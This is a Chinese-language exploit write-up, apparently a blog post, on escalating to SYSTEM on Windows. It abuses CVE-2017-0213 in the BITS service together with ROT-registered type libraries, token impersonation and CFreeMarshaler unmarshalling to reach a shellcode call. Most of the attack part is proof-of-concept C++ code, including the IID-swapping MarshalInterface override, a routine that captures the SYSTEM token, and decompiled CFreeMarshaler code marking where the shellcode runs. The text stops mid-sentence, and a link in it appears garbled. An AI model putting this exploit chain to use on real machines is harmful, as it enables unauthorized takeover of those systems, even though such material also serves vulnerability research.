
## 初始化与注册

先初始化一下`CoInitializeSecurity`注意这里的`appid`为自定义`com`组件的`appid`, 不然注册`Rot`无法使用

```cpp
hr = CoInitializeSecurity(
    &appid,
    -1,
    NULL,
    NULL,
    RPC_C_AUTHN_LEVEL_CONNECT,
    RPC_C_IMP_LEVEL_IMPERSONATE,
    NULL,
    EOAC_NO_CUSTOM_MARSHAL | EOAC_DYNAMIC_CLOAKING | 8,
    NULL);
```

```cpp
bstr_t target_tlb = GetExeDir() + L"\\testalt.dll";
```

`TypeLibWrapper` 实现`ITypeLib`接口的任意`TypeLib`对象

```cpp
TypeLibWrapper *tlb = new TypeLibWrapper(target_tlb, secret);
```

```cpp
ITypeLibPtr tlbptr = static_cast<ITypeLib*>(tlb);
IRunningObjectTablePtr l_spRunningObjectTable;
hr = GetRunningObjectTable(0, &l_spRunningObjectTable);
if (FAILED(hr))
{
    return false;
}
IMonikerPtr l_spMoniker;
```

`tlb_path`就是我们要用来代替的哪个`filemoniker`组件`dll`文件

```cpp
hr = CreateFileMoniker(tlb_path, &l_spMoniker);
```

在全局`Rot`注册以下就好了

```cpp
DWORD dm;
hr = l_spRunningObjectTable->Register(3, static_cast<ITypeLib*>(tlb), l_spMoniker, &dm);
    
if (FAILED(hr))
{
    return false;
}
```

`//CVE-2017-0213`的里面和方法一样只要在`MarshalInterface`时替换成自定义`com`组件的`guid`就行了

```cpp
TestBits(hEvent, pInner);
```

`CVE-2017-0213`需要使用具体触发方法

```cpp
virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
    /* [annotation][unique][in] */
    _In_  IStream *pStm,
    /* [annotation][in] */
    _In_  REFIID riid,
    /* [annotation][unique][in] */
    _In_opt_  void *pv,
    /* [annotation][in] */
    _In_  DWORD dwDestContext,
    /* [annotation][unique][in] */
    _Reserved_  void *pvDestContext,
    /* [annotation][in] */
    _In_  DWORD mshlflags)
{
    
    printf("Marshal Interface: %ls\n", IIDToBSTR(riid).GetBSTR());
    IID iid = riid;

    if (iid == __uuidof(IBackgroundCopyCallback2))
    {
        printf("Setting bad IID\n");
        
        CLSIDFromString(L"{E80A6EC1-39FB-462A-A56C-411EE9FC1AEB}", &iid);

        //这里的iid自定义com组件的guid
        HRESULT hr = CoMarshalInterface(pStm, iid, _unk, dwDestContext, pvDestContext, mshlflags);			
        return hr;

    }
    if (iid == __uuidof(IBackgroundCopyCallback))
    {
        
        HRESULT hr = CoMarshalInterface(pStm, iid, _unk, dwDestContext, pvDestContext, mshlflags);
        return hr;
    }
    
    return hr;
}
```

之后`bits`服务就会去加载自定义`com`组件的`typlelib`了,`bits`服务会把注册在`rot`上的`TypeLibWrapper`作为它要找的`typelib`,然后首先调用它的`GetTypeInfoOfGuid`方法,看`poc`代码:

```cpp
virtual HRESULT STDMETHODCALLTYPE GetTypeInfoOfGuid(
    /* [in] */ __RPC__in REFGUID guid,
    /* [out] */ __RPC__deref_out_opt ITypeInfo **ppTinfo) {
    try{
        //查看远程调用方的token,其实就是bits服务
        TryImpersonate();

        return S_OK;
        
    }
    catch (const _com_error& err)
    {
        printf("Error: %ls\n", err.ErrorMessage());
    }

    return S_OK;
}
```

```cpp
void TryImpersonate()
{
    if (m_ptoken == nullptr)
    {
        HRESULT hr = CoImpersonateClient();
        if (SUCCEEDED(hr))
        {
            HANDLE hToken;
            if (OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, FALSE, &hToken))
            {
                PTOKEN_USER user = (PTOKEN_USER)malloc(0x1000);
                DWORD ret_len = 0;

                if (GetTokenInformation(hToken, TokenUser, user, 0x1000, &ret_len))
                {
                    LPWSTR sid_name;

                    ConvertSidToStringSid(user->User.Sid, &sid_name);
                    printf(" Token is Name  => %ls \n", sid_name);
                    if ((wcscmp(sid_name, L"S-1-5-18") == 0) && (m_ptoken == nullptr))
                    {
                         //在这里就可确认确实是bits服务的systemtoken
                        printf("[!] System Token is Name  => %ls  ValuePointeris:%p \n", sid_name);			
                        // 有兴趣的可以看我子项目里面的方法查看token的详细信息
                        DumpToken(m_ptoken, TRUE);
                        
                    }
                    else
                    {
                        CloseHandle(hToken);
                    }

                    printf("Got Token: %p %ls\n", hToken, sid_name);
                    LocalFree(sid_name);

                }
                else
                {
                    printf("Error getting token user %d\n", GetLastError());
                }
                free(user);
            }
            else
            {
                printf("Error opening token %d\n", GetLastError());
            }
        }
    }
}
```

接下来就是重点如何利用这个`token`,或者说如何在`bits`服务中执行`shellcode`吗?

还记得这个`TypeLibWrapper`吗,`bits`服务要把他作为要找的`typelib`,然后首先调用它的`GetTypeInfoOfGuid`方法,在这之前由于`TypeLibWrapper`也是一个`com`对象,会`queryinterface`以下`IMarshal`接口,对了,这就是我利用它最终实现运行`shellcode`的突破点,既然是`IMarshal`,是否可以作为`CFreeMarshaler`来`unmarshalinerface`吗?读者有兴趣的花时间看下另一个`poc`的原文`b2dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4L8$3!0Y4L8r3g2H3M7X3!0B7k6h3y4@1P5X3g2J5L8#2)9J5k6h3u0D9L8$3N6K6M7r3!0@1i4K6u0W2K9%4u0Q4x3V1j5J5x3o6p5@1i4K6u0r3x3e0u0Q4x3V1j5`.

里面的原理是`CFreeMarshaler`最后会会从`unmarshal`的`stream`中序列化出来一个指针,然后`call`这个指针(也就是最终的`callshellcode`);

因为要用到`CFreeMarshaler`,先看我逆向它出来的源码:

```cpp
HRESULT __stdcall CFreeMarshaler::UnmarshalInterface(CFreeMarshaler *this, IStream *pStm, _GUID *riid, void **ppv)
{
  bool v4; // zf
  int v5; // eax
  __int64 tpv; // [esp+8h] [ebp-28h]
  unsigned int mshlflags; // [esp+10h] [ebp-20h]
  unsigned int cbSize; // [esp+14h] [ebp-1Ch]
  HRESULT hr; // [esp+18h] [ebp-18h]
  char secret[16]; // [esp+1Ch] [ebp-14h]

  *ppv = 0;
  //判断初始化CFreeMarshaler标志
  if ( !CFreeMarshaler::_fSecretInit )
    return -2147418113;
 //先读出第一个关于标志mshlflags
  pStm->_SelfStreamVtbl->Read(pStm, &mshlflags, 4u, &cbSize);
  if ( cbSize != 4 )
    return -2147418113;
  //先读出第二个最终shellcode的指针
  pStm->_SelfStreamVtbl->Read(pStm, &tpv, 8u, &cbSize);
  if ( cbSize != 8 )
    return -2147418113;
  //比较CFreeMarshaler中的secret,如果相同就ok了
  hr = pStm->_SelfStreamVtbl->Read(pStm, secret, 16u, &cbSize);
  if ( cbSize != 16 || memcmp(CFreeMarshaler::_SecretBlock, secret, 0x10u) )
    return -2147418113;
  v4 = mshlflags == 2;
  v5 = tpv;
   //最终shellcode的指针的poi
  *ppv = (void *)tpv;

  if ( v4 || mshlflags == 1 )
    //最终的callshellcode,本文的最终结果
    (*(void (__stdcall **)(int))(*(_DWORD *)v5 + 4))(v5);
  return hr;
}
```

比较简单就是是所构造好`CFreeMarshaler`::`_fSecretInit`和 `CFreeMarshaler`::`_SecretBlock`就可以了

我`poc`实现实现是:
